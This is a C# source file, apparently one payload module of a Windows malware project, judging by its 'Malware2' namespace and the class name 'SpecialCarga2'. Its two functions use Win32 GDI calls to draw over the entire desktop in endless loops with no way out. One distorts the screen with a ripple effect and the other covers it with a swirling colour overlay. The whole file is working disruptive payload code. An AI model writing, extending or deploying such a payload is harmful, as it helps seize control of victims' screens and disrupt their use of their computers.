using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Malware2
{
    public class SpecialCarga2
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateDIBSection(IntPtr hdc, [In] ref BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
                                              IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

        private const int SRCCOPY = 0x00CC0020;
        private const int BI_RGB = 0;

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            public RGBQUAD bmiColors;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }

        public static void EfeitoOndulacaoNaTela()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            BITMAPINFO bmpi = new BITMAPINFO();
            bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmpi.bmiHeader);
            bmpi.bmiHeader.biWidth = w;
            bmpi.bmiHeader.biHeight = h;
            bmpi.bmiHeader.biPlanes = 1;
            bmpi.bmiHeader.biBitCount = 32;
            bmpi.bmiHeader.biCompression = BI_RGB;

            IntPtr ppvBits;
            IntPtr bmp = CreateDIBSection(dc, ref bmpi, 0, out ppvBits, IntPtr.Zero, 0);
            SelectObject(dcCopy, bmp);

            unsafe
            {
                RGBQUAD* rgbquad = (RGBQUAD*)ppvBits;
                int i = 0;

                while (true)
                {
                    StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

                    for (int y = 0; y < h; y++)
                    {
                        for (int x = 0; x < w; x++)
                        {
                            int index = y * w + x;
                            int offsetX = (int)(10 * Math.Sin((double)x / 1 + i * 0.1));
                            int offsetY = (int)(10 * Math.Cos((double)y / 2 + i * 0.1));

                            int newX = x + offsetX;
                            int newY = y + offsetY;

                            if (newX >= 0 && newX < w && newY >= 0 && newY < h)
                            {
                                int newIndex = newY * w + newX;
                                rgbquad[index] = rgbquad[newIndex];
                            }
                        }
                    }

                    i++;
                    StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
                }
            }

            ReleaseDC(IntPtr.Zero, dc);
        }

        [DllImport("msimg32.dll")]
        private static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
                                              IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, BLENDFUNCTION blendFunction);

        private const byte AC_SRC_OVER = 0;

        public static void TurbilaoCores()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            BITMAPINFO bmpi = new BITMAPINFO();
            bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmpi.bmiHeader);
            bmpi.bmiHeader.biWidth = w;
            bmpi.bmiHeader.biHeight = h;
            bmpi.bmiHeader.biPlanes = 1;
            bmpi.bmiHeader.biBitCount = 32;
            bmpi.bmiHeader.biCompression = BI_RGB;

            IntPtr ppvBits;
            IntPtr bmp = CreateDIBSection(dc, ref bmpi, 0, out ppvBits, IntPtr.Zero, 0);
            SelectObject(dcCopy, bmp);

            unsafe
            {
                RGBQUAD* rgbquad = (RGBQUAD*)ppvBits;
                int i = 0;

                while (true)
                {
                    StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

                    double t = i * 0.05;

                    for (int x = 0; x < w; x++)
                    {
                        for (int y = 0; y < h; y++)
                        {
                            int index = y * w + x;

                            double dx = x - w / 2;
                            double dy = y - h / 2;
                            double distance = Math.Sqrt(dx * dx + dy * dy);
                            double angle = Math.Atan2(dy, dx) + t;

                            byte red = (byte)((Math.Sin(angle + t) + 1) / 2 * 255);
                            byte green = (byte)((Math.Cos(angle + t) + 1) / 2 * 255);
                            byte blue = (byte)((Math.Sin(distance / 10.0 + t) + 1) / 2 * 255);

                            rgbquad[index].rgbRed = red;
                            rgbquad[index].rgbGreen = green;
                            rgbquad[index].rgbBlue = blue;
                        }
                    }

                    BLENDFUNCTION blendFunction = new BLENDFUNCTION
                    {
                        BlendOp = AC_SRC_OVER,
                        BlendFlags = 0,
                        SourceConstantAlpha = 100, // 50% de transparência
                        AlphaFormat = 0
                    };

                    AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blendFunction);

                    i++;
                    Thread.Sleep(30);  // Adiciona um pequeno atraso para suavizar o efeito
                }
            }

            ReleaseDC(IntPtr.Zero, dc);
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BLENDFUNCTION
        {
            public byte BlendOp;
            public byte BlendFlags;
            public byte SourceConstantAlpha;
            public byte AlphaFormat;
        }
    }
}
